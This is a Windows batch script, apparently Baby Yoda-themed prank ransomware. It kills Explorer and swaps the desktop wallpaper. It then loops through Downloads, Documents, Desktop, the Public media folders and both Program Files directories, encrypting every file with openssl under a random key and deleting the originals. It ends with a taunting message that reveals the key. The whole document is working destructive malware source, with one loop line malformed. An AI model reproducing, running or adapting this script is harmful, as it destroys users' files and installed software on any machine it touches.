@echo off
title wenomechainsama.exe
set openssl=%USERPROFILE%\babyyoda\openssl.exe
set grogumasterkey=grogumasterkey%random%%random%%random%%random%
taskkill /f /IM explorer.exe
move %USERPROFILE%\babyyoda\babyyoda.bmp %USERPROFILE%\AppData\Local
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %USERPROFILE%\AppData\Local\babyyoda.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cd %USERPROFILE%\Downloads
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu-k %grogumasterkey% && del /f %%i
cd %USERPROFILE%\Documents
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd C:\Users\Public\Videos
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd "C:\Users\Public\Videos\Sample Videos"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd C:\Users\Public\Music
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd "C:\Users\Public\Music\Sample Music"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd %USERPROFILE%\Desktop
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd C:\Users\Public\Pictures
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd "C:\Users\Public\Pictures\Sample Pictures"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd "C:\Program Files"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
cd "C:\Program Files (x86)"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey% && del /f %%i
echo Oops! all of your GOD DAMN files got encrypted wanna get then back? well the key is %grogumasterkey%
cd %USERPROFILE%\babyyoda
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.grogu -k %grogumasterkey%
